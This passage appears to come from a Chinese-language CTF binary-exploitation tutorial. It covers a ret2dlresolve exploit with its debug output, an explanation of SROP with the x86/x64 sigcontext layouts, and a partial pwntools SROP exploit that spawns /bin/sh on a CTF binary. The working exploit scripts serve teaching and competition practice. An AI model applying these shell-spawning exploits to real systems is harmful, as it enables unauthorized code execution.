\nprocess\n(\n./main\n)\n\n\ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\nr\n.\nrecv\n()\n\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\noffset\n \n=\n \n112\n\n\nbss_base\n \n=\n \nrop\n.\nsection\n(\n.bss\n)\n\n\nbuf\n \n=\n \nrop\n.\nfill\n(\noffset\n)\n\n\n\nbuf\n \n+=\n \nrop\n.\ncall\n(\nread\n,\n \n0\n,\n \nbss_base\n,\n \n100\n)\n\n\n## used to call dl_Resolve()\n\n\nbuf\n \n+=\n \nrop\n.\ndl_resolve_call\n(\nbss_base\n \n+\n \n20\n,\n \nbss_base\n)\n\n\nr\n.\nsend\n(\nbuf\n)\n\n\n\nbuf\n \n=\n \nrop\n.\nstring\n(\n/bin/sh\n)\n\n\nbuf\n \n+=\n \nrop\n.\nfill\n(\n20\n,\n \nbuf\n)\n\n\n## used to make faking data, such relocation, Symbol, Str\n\n\nbuf\n \n+=\n \nrop\n.\ndl_resolve_data\n(\nbss_base\n \n+\n \n20\n,\n \nsystem\n)\n\n\nbuf\n \n+=\n \nrop\n.\nfill\n(\n100\n,\n \nbuf\n)\n\n\nr\n.\nsend\n(\nbuf\n)\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u5173\u4e8edl_resolve_call\u4e0edl_resolve_data\u7684\u5177\u4f53\u7ec6\u8282\u8bf7\u53c2\u8003roputils.py\u7684\u6e90\u7801\uff0c\u6bd4\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cdl_resolve\u6267\u884c\u5b8c\u4e4b\u540e\u4e5f\u662f\u9700\u8981\u6709\u5bf9\u5e94\u7684\u8fd4\u56de\u5730\u5740\u7684\u3002\n\n\n\u6548\u679c\u5982\u4e0b\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python roptool.py                       \n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n6114\n\n\n[\nDEBUG\n]\n Received 0x17 bytes:\n    \nWelcome to XDCTF2015~!\\n\n\n\n[\nDEBUG\n]\n Sent 0x94 bytes:\n    \n00000000\n  \n46\n 4c \n68\n \n78\n  \n52\n \n36\n \n67\n 6e  \n65\n \n47\n \n53\n \n58\n  \n71\n \n77\n \n51\n \n49\n  \u2502FLhx\u2502R6gn\u2502eGSX\u2502qwQI\u2502\n    \n00000010\n  \n32\n \n43\n 6c \n49\n  \n77\n \n76\n \n51\n \n33\n  \n47\n \n49\n 4a \n59\n  \n50\n \n74\n 6c \n38\n  \u25022ClI\u2502wvQ3\u2502GIJY\u2502Ptl8\u2502\n    \n00000020\n  \n57\n \n54\n \n68\n 4a  \n63\n \n48\n \n39\n \n62\n  \n46\n \n55\n \n52\n \n58\n  \n50\n \n73\n \n38\n \n64\n  \u2502WThJ\u2502cH9b\u2502FURX\u2502Ps8d\u2502\n    \n00000030\n  \n72\n 4c \n38\n \n63\n  \n50\n \n79\n \n37\n \n73\n  \n55\n \n45\n 7a \n32\n  6f \n59\n 5a \n42\n  \u2502rL8c\u2502Py7s\u2502UEz2\u2502oYZB\u2502\n    \n00000040\n  \n76\n \n59\n \n32\n \n43\n  \n74\n \n75\n \n77\n 6f  \n70\n \n56\n \n61\n \n44\n  6a \n73\n \n35\n 6b  \u2502vY2C\u2502tuwo\u2502pVaD\u2502js5k\u2502\n    \n00000050\n  \n41\n \n77\n \n78\n \n77\n  \n49\n \n72\n 7a \n49\n  \n70\n 4d \n31\n \n67\n  \n52\n 6f \n44\n 6f  \u2502Awxw\u2502IrzI\u2502pM1g\u2502RoDo\u2502\n    \n00000060\n  \n43\n \n44\n \n43\n 6e  \n45\n \n31\n \n50\n \n48\n  \n53\n \n73\n \n64\n \n30\n  6d \n54\n 7a 5a  \u2502CDCn\u2502E1PH\u2502Ssd0\u2502mTzZ\u2502\n    \n00000070\n  a0 \n83\n \n04\n \n08\n  \n19\n \n86\n \n04\n \n08\n  \n00\n \n00\n \n00\n \n00\n  \n40\n a0 \n04\n \n08\n  \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502@\u00b7\u00b7\u00b7\u2502\n    \n00000080\n  \n64\n \n00\n \n00\n \n00\n  \n80\n \n83\n \n04\n \n08\n  \n28\n 1d \n00\n \n00\n  \n79\n \n83\n \n04\n \n08\n  \u2502d\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n(\n\u00b7\u00b7\u00b7\u2502y\u00b7\u00b7\u00b7\u2502\n    \n00000090\n  \n40\n a0 \n04\n \n08\n                                         \u2502@\u00b7\u00b7\u00b7\u2502\u2502\n    \n00000094\n\n\n[\nDEBUG\n]\n Sent 0x64 bytes:\n    \n00000000\n  2f \n62\n \n69\n 6e  2f \n73\n \n68\n \n00\n  \n73\n \n52\n \n46\n \n66\n  \n57\n \n43\n \n59\n \n52\n  \u2502/bin\u2502/sh\u00b7\u2502sRFf\u2502WCYR\u2502\n    \n00000010\n  \n66\n 4c \n35\n \n52\n  \n78\n \n49\n 4c \n53\n  \n54\n a0 \n04\n \n08\n  \n07\n e9 \n01\n \n00\n  \u2502fL5R\u2502xILS\u2502T\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n    \n00000020\n  6e 6b \n45\n \n32\n  \n52\n \n76\n \n73\n 6c  \n00\n 1e \n00\n \n00\n  \n00\n \n00\n \n00\n \n00\n  \u2502nkE2\u2502Rvsl\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n    \n00000030\n  \n00\n \n00\n \n00\n \n00\n  \n12\n \n00\n \n00\n \n00\n  \n73\n \n79\n \n73\n \n74\n  \n65\n 6d \n00\n \n74\n  \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502syst\u2502em\u00b7t\u2502\n    \n00000040\n  5a 4f 4e 6c  6c \n73\n 4b 5a  \n76\n \n53\n \n48\n 6e  \n38\n \n37\n \n49\n \n47\n  \u2502ZONl\u2502lsKZ\u2502vSHn\u250287IG\u2502\n    \n00000050\n  \n69\n \n49\n \n52\n 6c  \n50\n \n44\n \n38\n \n67\n  \n45\n \n77\n \n75\n 6c  \n72\n \n47\n 6f \n67\n  \u2502iIRl\u2502PD8g\u2502Ewul\u2502rGog\u2502\n    \n00000060\n  \n55\n \n41\n \n52\n 4f                                         \u2502UARO\u2502\u2502\n    \n00000064\n\n\n[\n*\n]\n Switching to interactive mode\n$ ls\n\n[\nDEBUG\n]\n Sent 0x3 bytes:\n    \nls\\n\n\n\n[\nDEBUG\n]\n Received 0x8d bytes:\n    \ncore\\t     main    roptool.py   roputils.pyc\\tstage2.py  stage4.py  stage6.py\\n\n\n    \n__init__.py  main.c  roputils.py  stage1.py\\tstage3.py  stage5.py\\n\n\ncore         main    roptool.py   roputils.pyc    stage2.py  stage4.py  stage6.py\n__init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py\n\n\n\n\n\u9898\u76ee\n\n\nSROP\n\n\n\u57fa\u672c\u4ecb\u7ecd\n\n\nSROP(Sigreturn Oriented Programming)\u4e8e2014\u5e74\u88abVrije Universiteit Amsterdam\u7684Erik Bosman\u63d0\u51fa\uff0c\u5176\u76f8\u5173\u7814\u7a76\nFraming Signals \u2014 A Return to Portable Shellcode\n\u53d1\u8868\u5728\u5b89\u5168\u9876\u7ea7\u4f1a\u8bae\nOakland 2014\n\u4e0a\uff0c\u88ab\u8bc4\u9009\u4e3a\u5f53\u5e74\u7684\nBest Student Papers\n\u3002\u5176\u4e2d\u76f8\u5173\u7684paper\u4ee5\u53caslides\u7684\u94fe\u63a5\u5982\u4e0b\uff1a\n\n\npaper\n\n\nslides\n\n\n\u5176\u4e2d\uff0c\nsigreturn\n\u662f\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5728\u7c7bunix\u7cfb\u7edf\u53d1\u751fsignal\u7684\u65f6\u5019\u4f1a\u88ab\u95f4\u63a5\u5730\u8c03\u7528\u3002\n\n\nsignal\u673a\u5236\n\n\nsignal\u673a\u5236\u662f\u7c7bunix\u7cfb\u7edf\u4e2d\u8fdb\u7a0b\u4e4b\u95f4\u76f8\u4e92\u4f20\u9012\u4fe1\u606f\u7684\u4e00\u79cd\u65b9\u6cd5\u3002\u4e00\u822c\uff0c\u6211\u4eec\u4e5f\u79f0\u5176\u4e3a\u8f6f\u4e2d\u65ad\u4fe1\u53f7\uff0c\u6216\u8005\u8f6f\u4e2d\u65ad\u3002\u6bd4\u5982\u8bf4\uff0c\u8fdb\u7a0b\u4e4b\u95f4\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528kill\u6765\u53d1\u9001\u8f6f\u4e2d\u65ad\u4fe1\u53f7\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4fe1\u53f7\u673a\u5236\u5e38\u89c1\u7684\u6b65\u9aa4\u5982\u4e0b\u56fe\u6240\u793a\uff1a\n\n\n\n\n\n\n\n\n\u5185\u6838\u5411\u67d0\u4e2a\u8fdb\u7a0b\u53d1\u9001signal\u673a\u5236\uff0c\u8be5\u8fdb\u7a0b\u4f1a\u88ab\u6682\u65f6\u6302\u8d77\uff0c\u8fdb\u5165\u5185\u6838\u6001\u3002\n\n\n\n\n\n\n\u5185\u6838\u4f1a\u4e3a\u8be5\u8fdb\u7a0b\u4fdd\u5b58\u76f8\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c\n\u4e3b\u8981\u662f\u5c06\u6240\u6709\u5bc4\u5b58\u5668\u538b\u5165\u6808\u4e2d\uff0c\u4ee5\u53ca\u538b\u5165signal\u4fe1\u606f\uff0c\u4ee5\u53ca\u6307\u5411sigreturn\u7684\u7cfb\u7edf\u8c03\u7528\u5730\u5740\n\u3002\u6b64\u65f6\u6808\u7684\u7ed3\u6784\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u79f0ucontext\u4ee5\u53casiginfo\u8fd9\u4e00\u6bb5\u4e3aSignal Frame\u3002\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e00\u90e8\u5206\u662f\u5728\u7528\u6237\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u7684\u3002\n\u4e4b\u540e\u4f1a\u8df3\u8f6c\u5230\u6ce8\u518c\u8fc7\u7684signal handler\u4e2d\u5904\u7406\u76f8\u5e94\u7684signal\u3002\u56e0\u6b64\uff0c\u5f53signal handler\u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u5c31\u4f1a\u6267\u884csigreturn\u4ee3\u7801\u3002\n\n\n\n\n\u5bf9\u4e8esignal Frame\u6765\u8bf4\uff0c\u4e0d\u540c\u4f1a\u56e0\u4e3a\u67b6\u6784\u7684\u4e0d\u540c\u800c\u56e0\u6b64\u6709\u6240\u533a\u522b\uff0c\u8fd9\u91cc\u7ed9\u51fa\u5206\u522b\u7ed9\u51fax86\u4ee5\u53cax64\u7684sigcontext\n\n\n\n\nx86\n\n\n\n\nstruct\n \nsigcontext\n\n\n{\n\n  \nunsigned\n \nshort\n \ngs\n,\n \n__gsh\n;\n\n  \nunsigned\n \nshort\n \nfs\n,\n \n__fsh\n;\n\n  \nunsigned\n \nshort\n \nes\n,\n \n__esh\n;\n\n  \nunsigned\n \nshort\n \nds\n,\n \n__dsh\n;\n\n  \nunsigned\n \nlong\n \nedi\n;\n\n  \nunsigned\n \nlong\n \nesi\n;\n\n  \nunsigned\n \nlong\n \nebp\n;\n\n  \nunsigned\n \nlong\n \nesp\n;\n\n  \nunsigned\n \nlong\n \nebx\n;\n\n  \nunsigned\n \nlong\n \nedx\n;\n\n  \nunsigned\n \nlong\n \necx\n;\n\n  \nunsigned\n \nlong\n \neax\n;\n\n  \nunsigned\n \nlong\n \ntrapno\n;\n\n  \nunsigned\n \nlong\n \nerr\n;\n\n  \nunsigned\n \nlong\n \neip\n;\n\n  \nunsigned\n \nshort\n \ncs\n,\n \n__csh\n;\n\n  \nunsigned\n \nlong\n \neflags\n;\n\n  \nunsigned\n \nlong\n \nesp_at_signal\n;\n\n  \nunsigned\n \nshort\n \nss\n,\n \n__ssh\n;\n\n  \nstruct\n \n_fpstate\n \n*\n \nfpstate\n;\n\n  \nunsigned\n \nlong\n \noldmask\n;\n\n  \nunsigned\n \nlong\n \ncr2\n;\n\n\n};\n\n\n\n\n\n\n\nx64\n\n\n\n\nstruct\n \n_fpstate\n\n\n{\n\n  \n/* FPU environment matching the 64-bit FXSAVE layout.  */\n\n  \n__uint16_t\n        \ncwd\n;\n\n  \n__uint16_t\n        \nswd\n;\n\n  \n__uint16_t\n        \nftw\n;\n\n  \n__uint16_t\n        \nfop\n;\n\n  \n__uint64_t\n        \nrip\n;\n\n  \n__uint64_t\n        \nrdp\n;\n\n  \n__uint32_t\n        \nmxcsr\n;\n\n  \n__uint32_t\n        \nmxcr_mask\n;\n\n  \nstruct\n \n_fpxreg\n    \n_st\n[\n8\n];\n\n  \nstruct\n \n_xmmreg\n    \n_xmm\n[\n16\n];\n\n  \n__uint32_t\n        \npadding\n[\n24\n];\n\n\n};\n\n\n\nstruct\n \nsigcontext\n\n\n{\n\n  \n__uint64_t\n \nr8\n;\n\n  \n__uint64_t\n \nr9\n;\n\n  \n__uint64_t\n \nr10\n;\n\n  \n__uint64_t\n \nr11\n;\n\n  \n__uint64_t\n \nr12\n;\n\n  \n__uint64_t\n \nr13\n;\n\n  \n__uint64_t\n \nr14\n;\n\n  \n__uint64_t\n \nr15\n;\n\n  \n__uint64_t\n \nrdi\n;\n\n  \n__uint64_t\n \nrsi\n;\n\n  \n__uint64_t\n \nrbp\n;\n\n  \n__uint64_t\n \nrbx\n;\n\n  \n__uint64_t\n \nrdx\n;\n\n  \n__uint64_t\n \nrax\n;\n\n  \n__uint64_t\n \nrcx\n;\n\n  \n__uint64_t\n \nrsp\n;\n\n  \n__uint64_t\n \nrip\n;\n\n  \n__uint64_t\n \neflags\n;\n\n  \nunsigned\n \nshort\n \ncs\n;\n\n  \nunsigned\n \nshort\n \ngs\n;\n\n  \nunsigned\n \nshort\n \nfs\n;\n\n  \nunsigned\n \nshort\n \n__pad0\n;\n\n  \n__uint64_t\n \nerr\n;\n\n  \n__uint64_t\n \ntrapno\n;\n\n  \n__uint64_t\n \noldmask\n;\n\n  \n__uint64_t\n \ncr2\n;\n\n  \n__extension__\n \nunion\n\n    \n{\n\n      \nstruct\n \n_fpstate\n \n*\n \nfpstate\n;\n\n      \n__uint64_t\n \n__fpstate_word\n;\n\n    \n};\n\n  \n__uint64_t\n \n__reserved1\n \n[\n8\n];\n\n\n};\n\n\n\n\n\n\n\n\n\nsignal handler\u8fd4\u56de\u540e\uff0c\u5185\u6838\u4e3a\u6267\u884csigreturn\u7cfb\u7edf\u8c03\u7528\uff0c\u4e3a\u8be5\u8fdb\u7a0b\u6062\u590d\u4e4b\u524d\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587\uff0c\u5176\u4e2d\u5305\u62ec\u5c06\u6240\u6709\u538b\u5165\u7684\u5bc4\u5b58\u5668\uff0c\u91cd\u65b0pop\u56de\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u6700\u540e\u6062\u590d\u8fdb\u7a0b\u7684\u6267\u884c\u3002\u5176\u4e2d\uff0c32\u4f4d\u7684sigreturn\u7684\u8c03\u7528\u53f7\u4e3a77\uff0c64\u4f4d\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a15\u3002\n\n\n\n\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u4ed4\u7ec6\u56de\u987e\u4e00\u4e0b\u5185\u6838\u5728signal\u4fe1\u53f7\u5904\u7406\u7684\u8fc7\u7a0b\u4e2d\u7684\u5de5\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u5185\u6838\u4e3b\u8981\u505a\u7684\u5de5\u4f5c\u5c31\u662f\u4e3a\u8fdb\u7a0b\u4fdd\u5b58\u4e0a\u4e0b\u6587\uff0c\u5e76\u4e14\u6062\u590d\u4e0a\u4e0b\u6587\u3002\u8fd9\u4e2a\u4e3b\u8981\u7684\u53d8\u52a8\u90fd\u5728Signal Frame\u4e2d\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a\n\n\n\n\nSignal Frame\u88ab\u4fdd\u5b58\u5728\u7528\u6237\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\uff0c\u6240\u4ee5\u7528\u6237\u662f\u53ef\u4ee5\u8bfb\u5199\u7684\u3002\n\n\n\u7531\u4e8e\u5185\u6838\u4e0e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u65e0\u5173(kernel agnostic about signal handlers)\uff0c\u5b83\u5e76\u4e0d\u4f1a\u53bb\u8bb0\u5f55\u8fd9\u4e2asignal\u5bf9\u5e94\u7684Signal Frame\uff0c\u6240\u4ee5\u5f53\u6267\u884csigreturn\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u6b64\u65f6\u7684Signal Frame\u5e76\u4e0d\u4e00\u5b9a\u662f\u4e4b\u524d\u5185\u6838\u4e3a\u7528\u6237\u8fdb\u7a0b\u4fdd\u5b58\u7684Signal Frame\u3002\n\n\n\n\n\u8bf4\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\uff0cSROP\u7684\u57fa\u672c\u5229\u7528\u539f\u7406\u4e5f\u5c31\u51fa\u73b0\u4e86\u3002\u4e0b\u9762\u4e3e\u4e24\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002\n\n\n\u83b7\u53d6shell\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u5047\u8bbe\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u7528\u6237\u8fdb\u7a0b\u7684\u6808\uff0c\u90a3\u4e48\u5b83\u5c31\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2aSignal Frame\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8fd9\u91cc\u4ee564\u4f4d\u4e3a\u4f8b\u5b50\uff0c\u7ed9\u51faSignal Frame\u66f4\u52a0\u8be6\u7ec6\u7684\u4fe1\u606f\n\n\n\n\n\u5f53\u7cfb\u7edf\u6267\u884c\u5b8csigreturn\u7cfb\u7edf\u8c03\u7528\u4e4b\u540e\uff0c\u4f1a\u6267\u884c\u4e00\u7cfb\u5217\u7684pop\u6307\u4ee4\u4ee5\u4fbf\u4e8e\u6062\u590d\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5f53\u6267\u884c\u5230rip\u65f6\uff0c\u5c31\u4f1a\u5c06\u7a0b\u5e8f\u6267\u884c\u6d41\u6307\u5411syscall\u5730\u5740\uff0c\u6839\u636e\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\uff0c\u4fbf\u4f1a\u5f97\u5230\u4e00\u4e2ashell\u3002\n\n\nsystem call chains\n\n\n\u9700\u8981\u6307\u51fa\u7684\u662f\uff0c\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u53ea\u662f\u5355\u72ec\u7684\u83b7\u5f97\u4e00\u4e2ashell\u3002\u6709\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u5e0c\u671b\u6267\u884c\u4e00\u7cfb\u5217\u7684\u51fd\u6570\u3002\u6211\u4eec\u53ea\u9700\u8981\u505a\u4e24\u5904\u4fee\u6539\u5373\u53ef\n\n\n\n\n\u63a7\u5236\u6808\u6307\u9488\u3002\n\n\n\u628a\u539f\u6765rip\u6307\u5411\u7684\nsyscall\n gadget\u6362\u6210\nsyscall; ret\n gadget\u3002\n\n\n\n\n\u5982\u4e0b\u56fe\u6240\u793a \uff0c\u8fd9\u6837\u5f53\u6bcf\u6b21syscall\u8fd4\u56de\u7684\u65f6\u5019\uff0c\u6808\u6307\u9488\u90fd\u4f1a\u6307\u5411\u4e0b\u4e00\u4e2aSignal Frame\u3002\u56e0\u6b64\u5c31\u53ef\u4ee5\u6267\u884c\u4e00\u7cfb\u5217\u7684sigreturn\u51fd\u6570\u8c03\u7528\u3002\n\n\n\n\n\u540e\u7eed\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728\u6784\u9020ROP\u653b\u51fb\u7684\u65f6\u5019\uff0c\u9700\u8981\u6ee1\u8db3\u4e0b\u9762\u7684\u6761\u4ef6\n\n\n\n\n\u53ef\u4ee5\u901a\u8fc7\u6808\u6ea2\u51fa\u6765\u63a7\u5236\u6808\u7684\u5185\u5bb9\n\n\n\u9700\u8981\u77e5\u9053\u76f8\u5e94\u7684\u5730\u5740\n\n\n\"/bin/sh\"\n\n\nSignal Frame\n\n\nsyscal\n\n\nsigreturn\n\n\n\n\n\n\n\u9700\u8981\u6709\u591f\u5927\u7684\u7a7a\u95f4\u6765\u585e\u4e0b\u6574\u4e2asigal frame\n\n\n\n\n\u6b64\u5916\uff0c\u5173\u4e8esigreturn\u4ee5\u53casyscall;ret\u8fd9\u4e24\u4e2agadget\u5728\u4e0a\u9762\u5e76\u6ca1\u6709\u63d0\u53ca\u3002\u63d0\u51fa\u8be5\u653b\u51fb\u7684\u8bba\u6587\u4f5c\u8005\u53d1\u73b0\u4e86\u8fd9\u4e9bgadgets\u51fa\u73b0\u7684\u67d0\u4e9b\u5730\u5740\uff1a\n\n\n\n\n\u5e76\u4e14\uff0c\u4f5c\u8005\u53d1\u73b0\uff0c\u6709\u4e9b\u7cfb\u7edf\u4e0aSROP\u7684\u5730\u5740\u88ab\u968f\u673a\u5316\u4e86\uff0c\u800c\u6709\u4e9b\u5219\u6ca1\u6709\u3002\u6bd4\u5982\u8bf4\nLinux \n 3.3 x86_64\n\uff08\u5728Debian 7.0\uff0c Ubuntu Long Term Support\uff0c CentOS 6\u7cfb\u7edf\u4e2d\u9ed8\u8ba4\u5185\u6838\uff09\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728vsyscall\u4e2d\u7684\u56fa\u5b9a\u5730\u5740\u5904\u627e\u5230syscall\nreturn\u4ee3\u7801\u7247\u6bb5\u3002\u5982\u4e0b\n\n\n\n\n\u4f46\u662f\u76ee\u524d\u5b83\u5df2\u7ecf\u88ab\nvsyscall-emulate\n\u548c\nvdso\n\u673a\u5236\u4ee3\u66ff\u4e86\u3002\u6b64\u5916\uff0c\u76ee\u524d\u5927\u591a\u6570\u7cfb\u7edf\u90fd\u4f1a\u5f00\u542fASLR\u4fdd\u62a4\uff0c\u6240\u4ee5\u76f8\u5bf9\u6765\u8bf4\u8fd9\u4e9bgadgets\u90fd\u5e76\u4e0d\u5bb9\u6613\u627e\u5230\u3002\n\n\n\u503c\u5f97\u4e00\u8bf4\u7684\u662f\uff0c\u5bf9\u4e8esigreturn\u7cfb\u7edf\u8c03\u7528\u6765\u8bf4\uff0c\u572864\u4f4d\u7cfb\u7edf\u4e2d\uff0csigreturn\u7cfb\u7edf\u8c03\u7528\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a15\uff0c\u53ea\u9700\u8981RAX=15\uff0c\u5e76\u4e14\u6267\u884csyscall\u5373\u53ef\u5b9e\u73b0\u8c03\u7528syscall\u8c03\u7528\u3002\u800cRAX\u5bc4\u5b58\u5668\u7684\u503c\u53c8\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u6765\u95f4\u63a5\u63a7\u5236\uff0c\u6bd4\u5982\u8bf4read\u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002\n\n\n\u5229\u7528\u5de5\u5177\n\n\n\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5728\u76ee\u524d\u7684pwntools\u4e2d\u5df2\u7ecf\u96c6\u6210\u4e86\u5bf9\u4e8esrop\u7684\u653b\u51fb\u3002\n\n\n\u793a\u4f8b\n\n\n\u8fd9\u91cc\u4ee5360\u6625\u79cb\u676f\u4e2d\u7684smallest-pwn\u4e3a\u4f8b\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b\n\n\n\u786e\u5b9a\u6587\u4ef6\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  smallest file smallest     \nsmallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u8be5\u7a0b\u5e8f\u4e3a64\u4f4d\u9759\u6001\u94fe\u63a5\u7248\u672c\u3002\n\n\n\u68c0\u67e5\u4fdd\u62a4\n\n\n\u279c  smallest checksec smallest     \n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n\n\n\n\n\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\n\n\n\u6f0f\u6d1e\u53d1\u73b0\n\n\n\u5b9e\u7528IDA\u76f4\u63a5\u53cd\u7f16\u8bd1\u770b\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u7a0b\u5e8f\u5c31\u51e0\u884c\u6c47\u7f16\u4ee3\u7801\uff0c\u5982\u4e0b\n\n\npublic\n \nstart\n\n\nstart\n \nproc\n \nnear\n\n\nxor\n     \nrax\n,\n \nrax\n\n\nmov\n     \nedx\n,\n \n400\nh\n\n\nmov\n     \nrsi\n,\n \nrsp\n\n\nmov\n     \nrdi\n,\n \nrax\n\n\nsyscall\n\n\nretn\n\n\nstart\n \nendp\n\n\n\n\n\n\u6839\u636esyscall\u7684\u7f16\u53f7\u4e3a0\uff0c\u53ef\u4ee5\u77e5\u9053\u6539\u7a0b\u5e8f\u6267\u884c\u7684\u6307\u4ee4\u4e3aread(0,$rsp,400)\uff0c\u5373\u5411\u6808\u9876\u8bfb\u5165400\u4e2a\u5b57\u7b26\u3002\u6beb\u65e0\u7591\u95ee\uff0c\u8fd9\u4e2a\u662f\u6709\u6808\u6ea2\u51fa\u7684\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u5e76\u6ca1\u6709sigreturn\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u81ea\u5df1\u6784\u9020\uff0c\u6b63\u597d\u8fd9\u91cc\u6709read\u51fd\u6570\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7read\u51fd\u6570\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u6765\u8bbe\u7f6erax\u7684\u503c\u3002\u91cd\u8981\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u901a\u8fc7\u63a7\u5236read\u8bfb\u53d6\u7684\u5b57\u7b26\u6570\u6765\u8bbe\u7f6eRAX\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u4ece\u800c\u6267\u884csigreturn\n\n\n\u901a\u8fc7syscall\u6267\u884cexecve(\"/bin/sh\",0,0)\u6765\u83b7\u53d6shell\u3002\n\n\n\n\n\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \n*\n\n\nsmall\n \n=\n \nELF\n(\n./smallest\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n7777\n)\n\n\nelse\n:\n\n    \nsh\n \n=\n \nprocess\n(\n./smallest\n)\n\n\ncontext\n.\narch\n \n=\n \namd64\n\n\ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\nsyscall_ret\n \n=\n \n0x00000000004000BE\n\n\nstart_addr\n \n=\n \n0x00000000004000B0\n\n\n## set start addr three times\n\n\npayload\n \n=\n \np64\n(\nstart_addr\n)\n \n*\n \n3\n\n\nsh\n.\nsend\n(\npayload\n)\n\n\n\n## modify the return addr to start_addr+3\n\n\n## so that skip the xor rax,rax; then the rax=1\n\n\n## get stack addr\n\n\nsh\n.\nsend\n(\n\\xb3\n)\n\n\nstack_addr\n \n=\n \nu64\n(\nsh\n.\nrecv\n()[\n8\n:\n16\n])\n\n\nlog\n.\nsuccess\n(\nleak stack addr :\n \n+\n \nhex\n(\nstack_addr\n))\n\n\n\n## make the rsp point to stack_addr\n\n\n## the frame is read(0,stack_addr,0x400)\n\n\nsigframe\n \n=\n \nSigreturnFrame\n()\n\n\nsigframe\n.\nrax\n \n=\n \nconstants\n.\nSYS_read\n\n\nsigframe\n.\nrdi\n \n=\n \n0\n\n\nsigframe\n.\nrsi\n \n=\n \nstack_addr\n\n\nsigframe\n.\nrdx\n \n=\n \n0x400\n\n\nsigframe\n.\nrsp\n \n=\n \nstack_addr\n\n\nsigframe\n.\nrip\n \n=\n \nsyscall_ret\n\n\npayload\n \n=\n \np64\n(\nstart_addr\n)\n \n+\n \na\n \n*\n \n8\n \n+\n \nstr\n(\nsigframe\n)\n\n\nsh\n.\nsend\n(\npayload\n)\n\n\n\n## set rax=15 and call sigreturn\n\n\nsigreturn\n \n=\n \np64\n(\nsyscall_ret\n)\n \n+\n \nb\n \n*\n \n7\n\n\nsh\n.\nsend\n(\nsigreturn\n)\n\n\n\n## call execv(\n/bin/sh\n,0,0)\n\n\nsigframe\n \n=\n 